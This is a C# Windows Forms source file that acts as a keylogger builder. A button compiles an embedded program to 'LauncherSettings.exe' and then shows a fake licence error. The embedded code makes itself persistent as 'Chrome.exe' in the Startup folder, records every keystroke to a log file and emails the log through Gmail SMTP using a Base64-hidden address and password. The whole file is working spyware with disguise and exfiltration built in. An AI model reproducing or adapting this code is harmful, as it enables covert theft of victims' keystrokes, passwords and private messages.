using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Szejent2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Dictionary<string, string> version = new Dictionary<string, string>();
            version.Add("CompilerVersion", "v2.0");
            CSharpCodeProvider codeProvider = new CSharpCodeProvider(version);
            ICodeCompiler icc = codeProvider.CreateCompiler();
            string Output = "LauncherSettings.exe";
            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = Output;
            parameters.ReferencedAssemblies.Add("system.dll");
            parameters.ReferencedAssemblies.Add("system.windows.forms.dll");
            parameters.CompilerOptions = "/target:winexe";
            CompilerResults results = icc.CompileAssemblyFromSource(parameters, Kodlar());
            foreach (CompilerError item in results.Errors)
            {
                MessageBox.Show(item.ErrorText);
            }
            MessageBox.Show("Lisans Sözleşmeniz Mevcut Değildir.Ayarlardan Ücretsiz Sürümü Seçiniz.","Szejent2 Error!");
        }
        string Kodlar()
        {
            string kod = @"
using System;
using System.Web;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;

namespace denemeKonsol
{
    class Program
    {
        [DllImport(*user32.dll *)]
        static extern short GetAsyncKeyState(int vkey);
        delegate void KontrolHandler();
        static int gonDakika = 1;
        static int suankiDakika = 0;
        static int dk = 0;
        static string inputStr = Encoding.UTF8.GetString(Convert.FromBase64String(*bHVja3lkbnM2MzlAZ21haWwuY29t*));
        static string inputps = Encoding.UTF8.GetString(Convert.FromBase64String(*Nzc3MTEyMzU0OTk=*));
        static string eml = inputStr;
        static string pss = inputps;
        static string geml = inputStr;
        static void Main()
        { 
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\Chrome.exe *))
            {
                File.Copy(Path.GetFileName(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\Chrome.exe *);
            }
            suankiDakika = SuanDakika();
            KontrolHandler h = new KontrolHandler(Kontrol);
            h.BeginInvoke(new AsyncCallback(islemSonlandi), null);
            Console.ReadLine();
            Application.Run();
        }
        static Int16 MakeChar(Int16 key)
        {
            Int16[] keycode = { 220, 219, 222, 191, 186, 221 }, charcode = { 199, 286, 304, 214, 350, 220, 231, 287, 105, 246, 351, 252 };
            int keyIndex = Array.IndexOf(keycode, key);
            bool nocaps = (!Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys != Keys.Shift) || (Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys == Keys.Shift);
            if (nocaps && key > 64 && key < 91)
            {
                key = (Int16)(key == 73 ? 305 : key + 32);
            }
            else if (keyIndex != -1)
            {
                key = nocaps ? charcode[keyIndex + 6] : charcode[keyIndex];
            }
            Debug.Write((char)key);
            return key;
        }
        static void Kontrol()
        {
            while (true)
            {
                for (int i = 0; i < Int16.MaxValue; i++)
                {
                    if (GetAsyncKeyState(i).Equals(Int16.MinValue + 1))
                    {
                        char key = Convert.ToChar(MakeChar((Int16)i));
                        TusKaydet(key.ToString());
                    }
                }
                if (suankiDakika + gonDakika >= 60)
                {
                    dk = (suankiDakika + gonDakika) % 60;
                }
                else
                {
                    dk = suankiDakika + gonDakika;
                }
                if (SuanDakika() == dk)
                {
                    suankiDakika = SuanDakika();
                    MailGonder();
                }
            }
        }
        static void MailGonder()
        {
            string veriler = Oku();
            MailMessage mesaj = new MailMessage(eml, geml, *LOG *, veriler);
            SmtpClient smtp = new SmtpClient(*smtp.gmail.com *, 587);
            smtp.EnableSsl = true;
            smtp.UseDefaultCredentials = true;
            smtp.Credentials = new NetworkCredential(eml, pss);
            smtp.Send(mesaj);
        }
        static string Oku()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */ ChromeLog.txt *, FileMode.Open, FileAccess.Read);
            StreamReader sr = new StreamReader(fs);
            string veriler = sr.ReadToEnd();
            fs.Close();
            Sil();
            return veriler;
        }
        static void Sil()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */ ChromeLog.txt *, FileMode.Create, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(**);
            sw.Flush();
            fs.Close();
        }
        static int SuanDakika()
        {
            string suan = DateTime.Now.ToShortTimeString();
            int dakika = int.Parse(suan.Substring(suan.IndexOf(':') + 1, suan.Length - suan.IndexOf(':') - 1));
            return dakika;
        }
        static void islemSonlandi(IAsyncResult iar)
        {
        }
        static void TusKaydet(string tus)
        {
            FileStream fs = null;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */ ChromeLog.txt *))
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */ ChromeLog.txt *, FileMode.Append, FileAccess.Write);
            else
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */ ChromeLog.txt *, FileMode.CreateNew, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(tus);
            sw.Flush();
            fs.Close();
        }
    }
}
";

            kod = kod.Replace('*', '\"');
            return kod;
        }
        string hedef = "";
        private void hedefsecme_Click(object sender, EventArgs e)
        {
            if (folderBrowserDialog1.ShowDialog() == DialogResult.OK)
            {
                hedef = folderBrowserDialog1.SelectedPath.ToString();
                hedefkl.Text = hedef;
            }
        }
    }
}
